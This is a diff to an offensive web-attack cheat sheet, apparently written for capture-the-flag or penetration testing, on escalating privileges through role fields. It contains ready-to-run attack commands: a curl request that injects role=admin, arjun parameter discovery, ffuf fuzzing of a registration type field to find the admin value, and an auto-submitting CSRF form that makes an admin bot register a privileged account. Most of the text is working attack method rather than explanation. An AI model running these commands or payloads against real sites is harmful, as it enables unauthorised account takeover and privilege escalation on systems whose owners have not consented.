@@ -33,3 +33,13 @@ role: admin  (if a role is ever read from a request header/cookie)
 # test JSON vs form — frameworks bind differently:
 curl -s URL/api/user/update -H 'Cookie: COOKIE' -H 'Content-Type: application/json' -d '{"role":"admin"}'
 # find the hidden field first:  arjun -u URL/api/user/update -m POST
+
+## Discover the PRIVILEGED value of a role/type field (don't guess it)
+# Registration sends type=51 (or role=2 / group=3)? The admin value is another number — fuzz it:
+ffuf -w /usr/share/seclists/Fuzzing/numbers-1-1000.txt -u URL/register -X POST \
+  -d 'user=a&pass=b&type=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc 200,302 -ac
+# a different response size at e.g. type=100 = the admin role. Then register/CSRF with that value.
+# Can't set it yourself (server ignores it for low-priv)? Deliver a CSRF form that auto-submits
+# the privileged create/register request and get the ADMIN BOT to send it (scripts/csrf-gen.sh):
+#   <body onload="document.forms[0].submit()"><form method=POST action=/register>
+#     <input name=username value=pwn><input name=type value=100> ... </form></body>
